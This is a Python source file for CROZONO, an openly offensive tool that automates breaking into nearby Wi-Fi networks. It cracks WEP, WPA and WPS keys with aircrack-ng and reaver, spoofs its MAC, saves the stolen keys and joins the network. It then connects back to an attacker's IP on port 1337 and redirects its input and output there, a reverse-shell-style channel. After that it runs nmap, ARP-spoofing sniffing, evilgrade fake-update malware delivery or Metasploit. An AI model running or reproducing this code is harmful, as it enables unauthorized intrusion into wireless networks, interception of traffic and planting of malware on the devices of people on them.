#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
-------------------------------------------------------------------------
	CROZONO - 01.07.15.23.46.00 - www.crozono.com - crozono.pro@gmail.com

	Authors:
	Sheila Ayelen Berta a.k.a Shei Winker
	Twitter: @UnaPibaGeek
	Web: www.semecayounexploit.com (SMC1E)

	Nicolás Villanueva
	Twitter: @_nicovillanueva

	Licensed under the GNU General Public License Version 2 (GNU GPL v2),
		available at: http://www.gnu.org/licenses/gpl-2.0.txt

Kiwi :)
-------------------------------------------------------------------------

"""

#  ## LIBRARIES ##
import os
import time
import pexpect
import socket
import subprocess
import random
from subprocess import Popen, call, PIPE
from poormanslogging import info, warn, error

# ## GLOBAL VARIABLES ##
version = '1.5'
OS_PATH = os.getcwd()
LOG_FILE = OS_PATH + '/log_temp'
DN = open(os.devnull, 'w')

# ## ATTACKS TIME ##
AIRODUMP_SCAN_TIME = 30
WEP_AIREPLAY_TIME = 300
WPA_EXPECT_HANDSHAKE_TIME = 180
WPA_AIRCRACK_TIME = 20
EVILGRADE_ATTACK_TIME = 300


def get_target_mitm(gateway, ip_crozono):
	targets = []
	nmap_report = open(OS_PATH + '/cr0z0n0_nmap', 'r')
	for line in nmap_report:
		if line.startswith('Nmap scan report for'):
			ip = line.split(" ")[-1]
			if ip.startswith(("192", "172", "10")) and ip != gateway and ip != ip_crozono:
				targets.append(ip)
	return random.choice(targets)


def get_current_essid(iface):
	iwc = subprocess.Popen(['iwconfig', iface], stdout=PIPE)
	hea = subprocess.Popen(['head', '-1'], stdin=iwc.stdout, stdout=PIPE)
	gre = subprocess.Popen(['grep', '-oP', '\".+\"'], stdin=hea.stdout, stdout=PIPE)
	sout, serr = gre.communicate()
	if serr is not None:
		error("Error getting the current ESSID")
		return ""
	return sout.decode().strip().replace("\"", "")


def connect(essid, key, iface_mon=None):
	import fcntl
	import struct
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	tries = 0

	if iface_mon is not None:
			call(['airmon-ng', 'stop', iface_mon], stdout=DN, stderr=DN)
			time.sleep(1)

	iface = get_ifaces()[0]

	def do_connect():
		nonlocal sock
		nonlocal tries
		info("Connecting to '{0}' with key '{1}'".format(essid, key if key is not None else ''))

		cmd_connect = pexpect.spawn('iwconfig {0} essid "{1}" key s:{2}'.format(iface, essid, key))
		cmd_connect.logfile = open(LOG_FILE, 'wb')
		cmd_connect.expect(['Error', pexpect.TIMEOUT, pexpect.EOF], 3)
		cmd_connect.close()
		parse_log_connect = open(LOG_FILE, 'r')
		for line in parse_log_connect:
			if line.find('Error') != -1:
				wpa_supplicant = open('/etc/wpa_supplicant/wpa_supplicant.conf', 'w')
				wpa_supplicant.write('ctrl_interface=/var/run/wpa_supplicant\n')
				wpa_supplicant.write('network={\n')
				wpa_supplicant.write('ssid="' + essid + '"\n')
				wpa_supplicant.write('key_mgmt=WPA-PSK\n')
				wpa_supplicant.write('psk="' + key.strip() + '"\n')
				wpa_supplicant.write('}')
				wpa_supplicant.close()
				call(['ifconfig', iface, 'down'], stdout=DN, stderr=DN)
				call(['dhclient', iface, '-r'], stdout=DN, stderr=DN)
				call(['ifconfig', iface, 'up'], stdout=DN, stderr=DN)
				call(['iwconfig', iface, 'mode', 'managed'])
				call(['killall', 'wpa_supplicant'], stdout=DN, stderr=DN)
				call(['wpa_supplicant', '-B', '-c', '/etc/wpa_supplicant/wpa_supplicant.conf', '-i', iface], stdout=DN,
					stderr=DN)
				time.sleep(2)
		parse_log_connect.close()
		os.remove(LOG_FILE)
		tries += 1
		call(['dhclient', iface], stdout=DN, stderr=DN)
		time.sleep(4)

	do_connect()
	if get_current_essid(iface) != essid and tries < 5:
		warn('Connection to {e} failed. Retrying.'.format(e=essid))
		do_connect()
	if get_current_essid(iface) == essid:
		ipaddr = socket.inet_ntoa(
				fcntl.ioctl(sock.fileno(), 0x8915, struct.pack('256s', bytes(iface[:15], 'utf-8')))[20:24])
		info('Connection to {e} succeeded! Our IP is: {i}'.format(e=essid, i=ipaddr))
		return ipaddr
	else:
		error('Could not connect to {e} after 5 tries. Aborting'.format(e=essid))
		exit(1)


def save_key(essid, key):
	"""History with all keys cracked by date
	:param essid: Name of the ESSID for which the key was found
	:param key: ESSID's key
	"""
	with open(OS_PATH + '/passwords_cracked', 'a') as f:
		f.write("{t} - {e}: {k} \n".format(t=time.strftime('%H:%M:%S'), e=essid, k=key))
		f.close()


def wpa_attack(bssid, channel, iface_mon):
	if os.path.exists(OS_PATH + '/cr0z0n0_attack-01.csv'):
		os.remove(OS_PATH + '/cr0z0n0_attack-01.csv')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.cap')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')

	cmd_airodump = pexpect.spawn(
			'airodump-ng --bssid {0} -c {1} -w cr0z0n0_attack {2}'.format(bssid, channel, iface_mon))
	time.sleep(5)

	cmd_aireplay = pexpect.spawn('aireplay-ng -0 10 -a {0} {1}'.format(bssid, iface_mon))
	time.sleep(10)
	cmd_aireplay.close()

	cmd_airodump.expect(['handshake:', pexpect.TIMEOUT, pexpect.EOF], WPA_EXPECT_HANDSHAKE_TIME)
	cmd_airodump.close()

	cmd_crack = pexpect.spawn('aircrack-ng -w dic cr0z0n0_attack-01.cap')
	cmd_crack.logfile = open(LOG_FILE, 'wb')
	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], WPA_AIRCRACK_TIME)
	cmd_crack.close()
	key_found = False
	parse_log_crack = open(LOG_FILE, 'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			key_end = line.find(']')
			key_found = line[where + 13:key_end]
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found


def wpa_with_wps_attack(bssid, channel, iface_mon):
	cmd_reaver = pexpect.spawn(
			'reaver -i {0} -c {1} -b {2} -s n -K 1 -vv'.format(iface_mon, channel, bssid))  # no ended
	cmd_reaver.logfile = open(LOG_FILE, 'wb')
	cmd_reaver.expect(['WPS pin not found!', pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_reaver.close()

	key_found = False
	parse_log_crack = open(LOG_FILE, 'r')
	for line in parse_log_crack:
		if line.find('WPA PSK: ') != -1:
			key_found = line[line.find("WPA PSK: '") + 10:-1]
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found


def wps_check(bssid, iface_mon):
	cmd_wps = pexpect.spawn('wash -i {0}'.format(iface_mon))
	cmd_wps.logfile = open(LOG_FILE, 'wb')
	cmd_wps.expect([bssid, pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_wps.close()

	wps = False
	parse_log_wps = open(LOG_FILE, 'r')
	for line in parse_log_wps:
		if line.find(bssid) != -1:
			wps = True
	parse_log_wps.close()
	os.remove(LOG_FILE)

	return wps


def wep_attack(essid, bssid, channel, new_mac, iface_mon):
	if os.path.exists(OS_PATH + '/cr0z0n0_attack-01.csv'):
		os.remove(OS_PATH + '/cr0z0n0_attack-01.csv')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.cap')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.csv')
		os.remove(OS_PATH + '/cr0z0n0_attack-01.kismet.netxml')

	proc_airodump = subprocess.Popen(['airodump-ng', '--bssid', bssid, '-c', channel, '-w', 'cr0z0n0_attack', iface_mon],
						stdout=DN, stderr=DN)

	cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(essid, bssid, new_mac, iface_mon))
	cmd_auth.logfile = open(LOG_FILE, 'wb')
	cmd_auth.expect(['Association successful', pexpect.TIMEOUT, pexpect.EOF], 20)
	cmd_auth.close()
	parse_log_auth = open(LOG_FILE, 'r')
	for line in parse_log_auth:
		if line.find('Association successful') != -1:
			info("Association successful")
	parse_log_auth.close()
	os.remove(LOG_FILE)

	proc_aireplay = Popen(['aireplay-ng', '-3', '-e', '"' + essid + '"', '-b', bssid, '-h', new_mac, iface_mon],
						stdout=DN, stderr=DN)

	time.sleep(WEP_AIREPLAY_TIME)

	cmd_crack = pexpect.spawn('aircrack-ng cr0z0n0_attack-01.cap')
	cmd_crack.logfile = open(LOG_FILE, 'wb')
	cmd_crack.expect(['KEY FOUND!', 'Failed', pexpect.TIMEOUT, pexpect.EOF], 30)
	cmd_crack.close()
	key_found = False
	parse_log_crack = open(LOG_FILE, 'r')
	for line in parse_log_crack:
		where = line.find('KEY FOUND!')
		if where > -1:
			if line.find('ASCII') != -1:
				where2 = line.find('ASCII')
				key_end = line.find(')')
				key_found = line[where2 + 6:key_end]
			else:
				key_end = line.find(']')
				key_found = line[where + 13:key_end]
	parse_log_crack.close()
	os.remove(LOG_FILE)

	return key_found


def scan_targets(iface_mon, essid=None):
	"""
	Scans the surrounding networks for a predefined amount of time.
	Orders the found APs by power, and then returns the one with most IV captured (or the specified network in the essid parameter)
	The AP is represented by a dict, in the form:
		{'Privacy': 'WPA2 WPA', 'Authentication': 'PSK', 'channel': '1', 'ESSID': 'The Beardhouse', 'LAN IP': '0.  0.  0.  0', 'First time seen': '2015-12-15 04:10:22', 'Speed': '54', 'IV': '0', 'beacons': '25', 'ID-length': '14', 'Cipher': 'CCMP TKIP', 'Power': '-63', 'Last time seen': '2015-12-15 04:10:31', 'Key': '', 'BSSID': '38:60:77:A4:68:A1'}
	Notice that the keys are mapped to airodump-ng column names, EXCEPT for 'beacons' and 'IV'
	:param iface_mon: Monitoring interface with which to scan
	:param essid: If supplied, it gets the airodump information for this particular ESSID
	"""
	import csv
	info("Scanning {t} seconds for target WiFi access points...".format(t=AIRODUMP_SCAN_TIME))
	#  Delete old files:
	if os.path.exists(OS_PATH + '/cr0z0n0-01.csv'):
		os.remove(OS_PATH + '/cr0z0n0-01.csv')
		os.remove(OS_PATH + '/cr0z0n0-01.cap')
		os.remove(OS_PATH + '/cr0z0n0-01.kismet.csv')
		os.remove(OS_PATH + '/cr0z0n0-01.kismet.netxml')

	cmd_airodump = pexpect.spawn('airodump-ng -w cr0z0n0 {0}'.format(iface_mon))
	cmd_airodump.expect([pexpect.TIMEOUT, pexpect.EOF], AIRODUMP_SCAN_TIME)
	cmd_airodump.close()

	with open(OS_PATH + '/cr0z0n0-01.csv', 'r') as f:
		f.readline()  # skip empty line
		header = list(f.readline().split(', '))
		header = list(map(lambda x: x.replace('# ', '').strip(), header))  # cleanup
		d = csv.DictReader(f, delimiter=',', skipinitialspace=True, fieldnames=header)
		aps = []
		for e in d:
			if e.get('Power') is not None:
				aps.append(e)
			else:
				#  Nearing the end, there's the stations list,
				#  for which we don't care right now
				break
		if len(aps) == 0:
			error("No WiFi networks in range! Nothing we can do.")
			exit(1)
		if essid is None:
			for ap in aps:
				if ap.get('ESSID').find('00') != -1:
					aps.remove(ap)
			aps = sorted(aps, key=lambda x: x.get('Power'))
			# From the top 2, get the one with most IV
			return sorted(aps[:2], key=lambda x: x.get('IV'), reverse=True)[0]
		else:
			for ap in aps:
				if ap.get('ESSID') == essid:
					return ap


def mac_changer(iface_mon):
	import string
	s = "".join(random.sample(string.hexdigits, 12))
	s = (":".join([i + j for i, j in zip(s[::2], s[1::2])])).lower()
	call(['ifconfig', iface_mon, 'down'], stdout=DN, stderr=DN)
	call(['macchanger', '-m', s, iface_mon], stdout=DN, stderr=DN)
	call(['ifconfig', iface_mon, 'up'], stdout=DN, stderr=DN)
	return s


def check_interfering_processes(kill=True):
	s = subprocess.Popen(['airmon-ng', 'check', 'kill' if kill else None], stdout=DN)
	_, err = s.communicate()
	if err is not None:
		error('Error when killing interfering processes!')
		return False
	return True


def toggle_mode_monitor(iface, setting=True):
	check_interfering_processes(kill=True)
	subprocess.Popen(['airmon-ng', 'start' if setting else 'stop', iface], stdout=PIPE, stderr=PIPE).communicate()
	proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)

	for line in proc.communicate()[0].decode().split('\n'):
		if 'Mode:Monitor' in line:
			iface_mon = line.split()[0]
			return iface_mon
		else:
			error("Could not set interface in monitor mode!")
			exit()


def get_gateway():
	import struct
	with open('/proc/net/route', 'r') as fh:
		for line in fh:
			fields = line.strip().split()
			if fields[1] != '00000000' or not int(fields[3], 16) & 2:
				continue
			return socket.inet_ntoa(struct.pack("=L", int(fields[2], 16)))


def get_ifaces():
	"""Returns a list of interfaces (reported by airmon-ng) prefixed by the 'prefix' keyword"""
	ang = subprocess.Popen(['airmon-ng'], stdout=subprocess.PIPE)
	sout, serr = ang.communicate()
	i = list(filter(lambda x: x is not '' and not x.startswith("PHY"), sout.decode().split("\n")))
	return list(map(lambda x: x.split("\t")[1], i))


def hardware_setup():
	info("Setting interface to monitor mode")
	iface = get_ifaces()[0]
	iface_mon = toggle_mode_monitor(iface, True)
	return iface_mon


def parse_args():
	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('-e', '--essid', type=str, help="ESSID to target. Surround in quotes if it has spaces!")
	parser.add_argument('-k', '--key', type=str, help="Key to use for connect to ESSID")
	parser.add_argument('-a', '--attack', type=str, help="Attack to perform")
	parser.add_argument('-d', '--dest', type=str, help="Destination to where to send info (attacker's IP)")
	return parser.parse_args()


def check_lan_attacks_dependences():
	if not os.path.exists('/usr/bin/nmap'):
		error("You must install Nmap.")
		exit(1)
	if not os.path.exists('/usr/bin/ettercap'):
		error("You must install Ettercap.")
		return False
	if not os.path.exists('/usr/bin/tshark'):
		error("You must install Tshark.")
		return False
	if not os.path.exists('/usr/bin/msfconsole'):
		error("You must install Metasploit.")
		return False
	return True


def check_wlan_attacks_dependences():
	if not os.path.exists('/usr/bin/aircrack-ng'):
		error("You must install aircrack-ng suite.")
		return False
	if not os.path.exists('/usr/bin/reaver'):
		error("You must install Reaver.")
		return False
	if not os.path.exists('/usr/bin/pixiewps'):
		error("You must install PixieWPS.")
		return False
	return True


def check_root():
	return os.geteuid() == 0


def banner():
	global version
	from pyfiglet import figlet_format
	b = figlet_format("      CROZONO") + \
'''
	Sheila A. Berta - Nicolás Villanueva		{v}
		Software Development
	Pablo Romanos - Hardware Implementation
	'''.format(v=version)
	print(b)


def main():
	banner()
	if not check_root():
		error('You need root privileges to run CROZONO!\n')
		exit(1)
	if not check_wlan_attacks_dependences():
		exit(1)

	info("CROZONO running...")

	args = parse_args()

	if args.essid is not None:
		if args.key is not None:
			ap_target = False
			ip_lan = connect(args.essid, args.key)
		else:
			iface_mon = hardware_setup()
			new_mac = mac_changer(iface_mon)
			ap_target = scan_targets(iface_mon, args.essid)
	else:
		iface_mon = hardware_setup()
		new_mac = mac_changer(iface_mon)
		ap_target = scan_targets(iface_mon)

	# -------------------- Infiltrate wifi --------------------
	if ap_target:
		target_essid = ap_target.get('ESSID').strip()
		target_bssid = ap_target.get('BSSID').strip()
		target_channel = ap_target.get('channel').strip()
		target_privacy = ap_target.get('Privacy').strip()

		info("Target selected: " + target_essid)

		if target_privacy == 'WEP':
			info("Cracking {e} access point with WEP privacy...".format(e=target_essid))
			key = wep_attack(target_essid, target_bssid, target_channel, new_mac, iface_mon)
			if not key:
				error("Key not found! :(")
				exit()
			else:
				info("Key found!: {k} ".format(k=key))
				save_key(target_essid, key)
				ip_lan = connect(target_essid, key, iface_mon)

		elif target_privacy == 'WPA' or target_privacy == 'WPA2' or target_privacy == 'WPA2 WPA':
			info("Cracking {e} access point with {p} privacy...".format(e=target_essid, p=target_privacy))

			wps = wps_check(target_bssid, iface_mon)

			if wps:
				info("WPS is enabled")
				key = wpa_with_wps_attack(target_bssid, target_channel, iface_mon)
				if not key:
					warn("PIN not found! Trying with conventional WPA attack...")
					key = wpa_attack(target_bssid, target_channel, iface_mon)
			else:
				warn("WPS is not enabled")
				key = wpa_attack(target_bssid, target_channel, iface_mon)

			if not key:
				error("Key not found! :(")
				exit()
			else:
				info("Key found!: {k} ".format(k=key))
				save_key(target_essid, key)
				ip_lan = connect(target_essid, key, iface_mon)
		else:
			info("Open network!")
			ip_lan = connect(target_essid, None, iface_mon)

	# -------------------- Acquired LAN range --------------------

	ip_lan = ip_lan.strip()
	net = ip_lan.split('.')
	range_net = net[0] + '.' + net[1] + '.' + net[2] + '.1-255'

	# -------------------- Connect to attacker and relay nmap info --------------------

	if os.path.exists(OS_PATH + '/cr0z0n0_nmap'):
		os.remove(OS_PATH + '/cr0z0n0_nmap')

	if not check_lan_attacks_dependences():
		exit(1)

	attacker = args.dest

	if attacker is not None:
		info("Sending information about network to attacker ({ip}) and running attacks...".format(ip=attacker))
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((attacker, 1337))
		os.dup2(s.fileno(), 0)
		os.dup2(s.fileno(), 1)
		os.dup2(s.fileno(), 2)
		banner()
		info("Hello! :)")
		info("Executing Nmap...")
		call(['nmap', '-O', '-sV', '-oN', 'cr0z0n0_nmap', '--exclude', ip_lan, range_net], stderr=DN)
	else:
		warn("Attacker not defined! Ending...")
		exit()

	# -------------------- Attacks --------------------

	attack = args.attack

	if attack == 'sniffing-mitm':
		iface = get_ifaces()[0]
		gateway = get_gateway().strip()
		target_mitm = get_target_mitm(gateway, ip_lan)
		info("Executing MITM and Sniffing attacks between {g} and {m}...".format(g=gateway, m=target_mitm))
		cmd_ettercap = pexpect.spawn(
				'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i}'.format(g=gateway, m=target_mitm, i=iface))
		time.sleep(2)
		# cmd_tshark = pexpect.spawn('tshark -i {i} -w cr0z0n0_sniff'.format(i=iface))
		proc = subprocess.call(["tshark", "-i", iface], stderr=DN)

	elif attack == 'evilgrade':
		modules = open(OS_PATH + '/evilgrade/modules.txt', 'r')
		agent = OS_PATH + '/evilgrade/agent.exe'
		for line in modules:
			print(line.replace('\n', ''))
		print("\n\n Select module to use: ")
		plugin = input()
		info("Thank you! Evilgrade will be executed!")
		s.shutdown(1)

		if os.path.exists('/etc/ettercap/etter.dns'):
			call(['rm', '/etc/ettercap/etter.dns'])
		etter_template = open(OS_PATH + '/evilgrade/etter.dns.template', 'r')
		etter_dns = open(OS_PATH + '/evilgrade/etter.dns', 'w')
		for line in etter_template:
			line = line.replace('IP', ip_lan)
			etter_dns.write(line)
		etter_dns.close()
		etter_template.close()
		call(['mv', './evilgrade/etter.dns', '/etc/ettercap/etter.dns'])

		evilgrade = pexpect.spawn('evilgrade')
		evilgrade.expect('evilgrade>')
		evilgrade.sendline('configure ' + plugin)
		evilgrade.sendline('set agent ' + agent)
		evilgrade.sendline('start')
		time.sleep(1)

		iface = get_ifaces()[0]
		gateway = get_gateway().strip()
		target_mitm = get_target_mitm(gateway, ip_lan)
		cmd_ettercap = pexpect.spawn(
				'ettercap -T -M arp:remote /{g}/ /{m}/ -i {i} -P dns_spoof'.format(g=gateway, m=target_mitm, i=iface))
		time.sleep(EVILGRADE_ATTACK_TIME)

	elif attack == 'metasploit':
		info("Executing Metasploit...")
		proc = subprocess.call(["msfconsole"], stderr=DN)
	else:
		warn("Attack not defined!")

	s.shutdown(1)

	info("CROZONO has finished! Good bye! ;)")


main()
